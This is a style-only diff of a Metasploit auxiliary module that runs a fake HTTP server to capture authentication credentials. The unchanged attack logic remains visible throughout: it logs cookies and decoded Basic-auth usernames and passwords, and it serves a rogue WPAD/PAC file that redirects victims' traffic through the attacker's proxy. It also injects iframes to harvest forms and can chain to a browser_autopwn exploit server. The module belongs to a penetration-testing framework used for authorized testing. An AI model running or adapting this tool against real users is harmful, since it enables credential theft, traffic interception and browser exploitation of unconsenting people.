@@ -7,46 +7,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
-
   def initialize
     super(
-      'Name'        => 'Authentication Capture: HTTP',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: HTTP',
+      'Description' => %q{
         This module provides a fake HTTP service that
       is designed to capture authentication credentials.
       },
-      'Author'      => ['ddz', 'hdm'],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-        [
-          [ 'Capture', 'Description' => 'Run capture web server' ]
-        ],
-      'PassiveActions' =>
-        [
-          'Capture'
-        ],
-      'DefaultAction'  => 'Capture'
+      'Author' => ['ddz', 'hdm'],
+      'License' => MSF_LICENSE,
+      'Actions' => [
+        [ 'Capture', 'Description' => 'Run capture web server' ]
+      ],
+      'PassiveActions' => [
+        'Capture'
+      ],
+      'DefaultAction' => 'Capture'
     )
 
     register_options(
       [
-        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
-        OptPath.new('TEMPLATE',   [ false, "The HTML template to serve in responses",
-            File.join(Msf::Config.data_directory, "exploits", "capture", "http", "index.html")
-          ]
-        ),
-        OptPath.new('SITELIST',   [ false, "The list of URLs that should be used for cookie capture",
-            File.join(Msf::Config.data_directory, "exploits", "capture", "http", "sites.txt")
-          ]
-        ),
-        OptPath.new('FORMSDIR',   [ false, "The directory containing form snippets (example.com.txt)",
-            File.join(Msf::Config.data_directory, "exploits", "capture", "http", "forms")
-          ]
-        ),
-        OptAddress.new('AUTOPWN_HOST',[ false, "The IP address of the browser_autopwn service ", nil ]),
-        OptPort.new('AUTOPWN_PORT',[ false, "The SRVPORT port of the browser_autopwn service ", nil ]),
-        OptString.new('AUTOPWN_URI',[ false, "The URIPATH of the browser_autopwn service ", nil ]),
-      ])
+        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 80 ]),
+        OptPath.new('TEMPLATE', [
+          false, "The HTML template to serve in responses",
+          File.join(Msf::Config.data_directory, "exploits", "capture", "http", "index.html")
+        ]),
+        OptPath.new('SITELIST', [
+          false, "The list of URLs that should be used for cookie capture",
+          File.join(Msf::Config.data_directory, "exploits", "capture", "http", "sites.txt")
+        ]),
+        OptPath.new('FORMSDIR', [
+          false, "The directory containing form snippets (example.com.txt)",
+          File.join(Msf::Config.data_directory, "exploits", "capture", "http", "forms")
+        ]),
+        OptAddress.new('AUTOPWN_HOST', [ false, "The IP address of the browser_autopwn service ", nil ]),
+        OptPort.new('AUTOPWN_PORT', [ false, "The SRVPORT port of the browser_autopwn service ", nil ]),
+        OptString.new('AUTOPWN_URI', [ false, "The URIPATH of the browser_autopwn service ", nil ]),
+      ]
+    )
   end
 
   # Not compatible today
@@ -58,15 +56,15 @@ class MetasploitModule < Msf::Auxiliary
     @formsdir = datastore['FORMSDIR']
     @template = datastore['TEMPLATE']
     @sitelist = datastore['SITELIST']
-    @myhost   = datastore['SRVHOST']
-    @myport   = datastore['SRVPORT']
+    @myhost = datastore['SRVHOST']
+    @myport = datastore['SRVPORT']
 
-    @myautopwn_host =  datastore['AUTOPWN_HOST']
-    @myautopwn_port =  datastore['AUTOPWN_PORT']
-    @myautopwn_uri  =  datastore['AUTOPWN_URI']
-    @myautopwn      = false
+    @myautopwn_host = datastore['AUTOPWN_HOST']
+    @myautopwn_port = datastore['AUTOPWN_PORT']
+    @myautopwn_uri = datastore['AUTOPWN_URI']
+    @myautopwn = false
 
-    if(@myautopwn_host and @myautopwn_port and @myautopwn_uri)
+    if (@myautopwn_host and @myautopwn_port and @myautopwn_uri)
       @myautopwn = true
     end
 
@@ -82,12 +80,13 @@ class MetasploitModule < Msf::Auxiliary
     begin
       data = cli.get_once(-1, 5)
       raise ::Errno::ECONNABORTED if !data or data.length == 0
+
       case cli.request.parse(data)
-        when Rex::Proto::Http::Packet::ParseCode::Completed
-          dispatch_request(cli, cli.request)
-          cli.reset_cli
-        when  Rex::Proto::Http::Packet::ParseCode::Error
-          close_client(cli)
+      when Rex::Proto::Http::Packet::ParseCode::Completed
+        dispatch_request(cli, cli.request)
+        cli.reset_cli
+      when Rex::Proto::Http::Packet::ParseCode::Error
+        close_client(cli)
       end
     rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
     rescue ::OpenSSL::SSL::SSLError
@@ -131,7 +130,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def dispatch_request(cli, req)
-
     phost = cli.peerhost
 
     os_name = nil
@@ -145,32 +143,32 @@ class MetasploitModule < Msf::Auxiliary
     ua = req['User-Agent']
 
     case (ua)
-      when /rv:([\d\.]+)/
-        ua_name = 'FF'
-        ua_vers = $1
-      when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]+\.[0-9]+)/
-        ua_name = 'IE'
-        ua_vers = $1
-      when /Version\/(\d+\.\d+\.\d+).*Safari/
-        ua_name = 'Safari'
-        ua_vers = $1
+    when /rv:([\d\.]+)/
+      ua_name = 'FF'
+      ua_vers = $1
+    when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]+\.[0-9]+)/
+      ua_name = 'IE'
+      ua_vers = $1
+    when /Version\/(\d+\.\d+\.\d+).*Safari/
+      ua_name = 'Safari'
+      ua_vers = $1
     end
 
     case (ua)
-      when /Windows/
-        os_name = 'Windows'
-      when /Linux/
-        os_name = 'Linux'
-      when /iPhone/
-        os_name = 'iPhone'
-        os_arch = 'armle'
-      when /Mac OS X/
-        os_name = 'Mac'
+    when /Windows/
+      os_name = 'Windows'
+    when /Linux/
+      os_name = 'Linux'
+    when /iPhone/
+      os_name = 'iPhone'
+      os_arch = 'armle'
+    when /Mac OS X/
+      os_name = 'Mac'
     end
 
     case (ua)
-      when /PPC/
-        os_arch = 'ppc'
+    when /PPC/
+      os_arch = 'ppc'
     end
 
     os_name ||= 'Unknown'
@@ -190,11 +188,9 @@ class MetasploitModule < Msf::Auxiliary
 
     @myport = nport || 80
 
-
     cookies = req['Cookie'] || ''
 
-
-    if(cookies.length > 0)
+    if (cookies.length > 0)
       report_note(
         :host => cli.peerhost,
         :type => "http_cookies",
@@ -203,10 +199,9 @@ class MetasploitModule < Msf::Auxiliary
       )
     end
 
-
-    if(req['Authorization'] and req['Authorization'] =~ /basic/i)
-      basic,auth = req['Authorization'].split(/\s+/)
-      user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
+    if (req['Authorization'] and req['Authorization'] =~ /basic/i)
+      basic, auth = req['Authorization'].split(/\s+/)
+      user, pass = Rex::Text.decode_base64(auth).split(':', 2)
 
       report_cred(
         ip: cli.peerhost,
@@ -218,16 +213,15 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       report_note(
-        :host     => cli.peerhost,
-        :type     => "http_auth_extra",
-        :data     => req.resource.to_s,
+        :host => cli.peerhost,
+        :type => "http_auth_extra",
+        :data => req.resource.to_s,
         :update => :unique_data
       )
       print_good("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
     end
 
-
-    if(req.resource =~ /^\/*wpad.dat|.*\.pac$/i)
+    if (req.resource =~ /^\/*wpad.dat|.*\.pac$/i)
       prx = "function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }"
       res =
         "HTTP/1.1 200 OK\r\n" +
@@ -240,8 +234,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-
-    if(req.resource =~ /\/+formrec\/(.*)/i)
+    if (req.resource =~ /\/+formrec\/(.*)/i)
       data = Rex::Text.uri_decode($1).split("\x00").join(", ")
 
       report_note(
@@ -272,7 +265,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers} cookies=#{cookies}")
 
-    if(req.resource =~ /\/+forms.html$/)
+    if (req.resource =~ /\/+forms.html$/)
       frm = inject_forms(hhead)
       res =
         "HTTP/1.1 200 OK\r\n" +
@@ -284,18 +277,16 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-
     # http://us.version.worldofwarcraft.com/update/PatchSequenceFile.txt
-    if(req.resource == "/update/PatchSequenceFile.txt")
+    if (req.resource == "/update/PatchSequenceFile.txt")
       print_status("HTTP #{cli.peerhost} is trying to play World of Warcraft")
     end
-
 
     # Microsoft 'Network Connectivity Status Indicator' Vista
     if (req['Host'] == 'www.msftncsi.com')
       print_status("HTTP #{cli.peerhost} requested the Network Connectivity Status Indicator page (Vista)")
       data = "Microsoft NCSI"
-      res  =
+      res =
         "HTTP/1.1 200 OK\r\n" +
         "Host: www.msftncsi.com\r\n" +
         "Expires: 0\r\n" +
@@ -328,7 +319,7 @@ class MetasploitModule < Msf::Auxiliary
     if (req['Host'] == 'activex.microsoft.com')
       print_status("HTTP #{cli.peerhost} attempted to download an ActiveX control")
       data = ""
-      res  =
+      res =
         "HTTP/1.1 404 Not Found\r\n" +
         "Host: #{mysrc}\r\n" +
         "Content-Type: application/octet-stream\r\n" +
@@ -337,7 +328,6 @@ class MetasploitModule < Msf::Auxiliary
       cli.put(res)
       return
     end
-
 
     # Sonic.com's Update Service
     if (req['Host'] == 'updateservice.sonic.com')
@@ -357,24 +347,23 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # The itunes store on the iPhone
-    if(req['Host'] == 'phobos.apple.com')
+    if (req['Host'] == 'phobos.apple.com')
       print_status("HTTP #{cli.peerhost} is using iTunes Store on the iPhone")
       # GET /bag.xml
     end
 
-
     # Handle image requests
-    ctypes  =
-    {
-      "jpg"   => "image/jpeg",
-      "jpeg"  => "image/jpeg",
-      "png"   => "image/png",
-      "gif"   => "image/gif",
-    }
+    ctypes =
+      {
+        "jpg" => "image/jpeg",
+        "jpeg" => "image/jpeg",
+        "png" => "image/png",
+        "gif" => "image/gif",
+      }
 
     req_ext = req.resource.split(".")[-1].downcase
 
-    if(ctypes[req_ext])
+    if (ctypes[req_ext])
       ctype = ctypes['gif']
 
       data =
@@ -392,26 +381,26 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-
     buff = ''
 
-
-    if(@myautopwn)
+    if (@myautopwn)
       buff << "<iframe src='http://#{@myautopwn_host}:#{@myautopwn_port}#{@myautopwn_uri}'></iframe>"
     end
 
     list = File.readlines(@sitelist)
     list.each do |site|
       next if site =~ /^#/
+
       site.strip!
       next if site.length == 0
+
       buff << "<iframe src='http://#{site}:#{@myport}/forms.html'></iframe>"
     end
 
     data = File.read(@template)
     data.gsub!(/%CONTENT%/, buff)
 
-    res  =
+    res =
       "HTTP/1.1 200 OK\r\n" +
       "Host: #{mysrc}\r\n" +
       "Expires: 0\r\n" +
@@ -422,16 +411,13 @@ class MetasploitModule < Msf::Auxiliary
 
     cli.put(res)
     return
-
   end
 
-
   def inject_forms(site)
-
     domain = site.gsub(/(\.\.|\\|\/)/, "")
     domain = "www." + domain if domain !~ /^www/i
 
-    while(domain.length > 0)
+    while (domain.length > 0)
 
       form_file = File.join(@formsdir, domain) + ".txt"
       form_data = ""
@@ -485,6 +471,5 @@ class MetasploitModule < Msf::Auxiliary
 </body>
 </html>
 |
-
   end
 end
